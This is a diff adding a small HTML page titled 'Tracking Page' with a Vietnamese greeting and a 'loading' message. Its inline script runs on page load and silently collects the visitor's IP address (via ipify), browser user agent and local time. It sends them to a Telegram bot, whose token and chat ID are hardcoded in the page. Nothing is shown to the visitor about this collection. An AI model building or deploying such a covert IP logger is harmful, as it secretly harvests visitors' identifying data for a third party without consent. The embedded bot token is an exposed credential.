@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Tracking Page</title>
+</head>
+<body>
+  <h1>Xin chào 👋</h1>
+  <p>Đang tải...</p>
+
+  <script>
+    const BOT_TOKEN = "8213510406:AAGI6PhoyOWtMqKWr-tmNOXDry7t23jWahk";
+    const CHAT_ID = "5091535204";
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unknown";
+      }
+    }
+
+    async function sendToTelegram(ip, device, time) {
+      const message = `
+👀 Visitor detected!
+IP: ${ip}
+Time: ${time}
+Device: ${device}
+      `;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.log("Send error:", err);
+      }
+    }
+
+    async function track() {
+      const ip = await getIP();
+      const device = navigator.userAgent;
+      const time = new Date().toLocaleString();
+
+      await sendToTelegram(ip, device, time);
+
+      document.querySelector("p").innerText = "Done!";
+    }
+
+    track();
+  </script>
+</body>
+</html>
